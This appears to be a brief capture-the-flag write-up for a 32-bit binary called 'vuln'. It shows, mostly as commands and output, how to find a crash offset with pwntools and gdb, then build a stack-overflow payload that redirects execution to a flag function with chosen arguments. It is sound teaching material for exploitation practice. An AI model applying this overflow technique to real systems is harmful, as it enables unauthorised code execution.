Get the address of flag function with objdump.

```
  objdump -D vuln|grep flag

080485e6 <flag>:
  ...
```


Run vuln with gdb

Input a long string to cause a sigmentation fault

```
python -c 'import pwn;print(pwn.cyclic(256))'|gdb ./vuln --eval-command r
...
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac

Program received signal SIGSEGV, Segmentation fault.
0x62616177 in ?? ()
...
```

Find out cyclic in with python pwn module

```
>>> pwn.cyclic_find(pwn.p32(0x62616177))
>>> 188
```

Accroding to 
[return to libc tutorial](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)


Let's pass the arguments to vuln

```
python -c "import pwn;print('A'*188+pwn.p32(0x080485e6)+'A'*4+pwn.p32(0xdeadbeef)+pwn.p32(0xc0ded00d))"|./vuln
```

One flag is in the segmentation fault error.
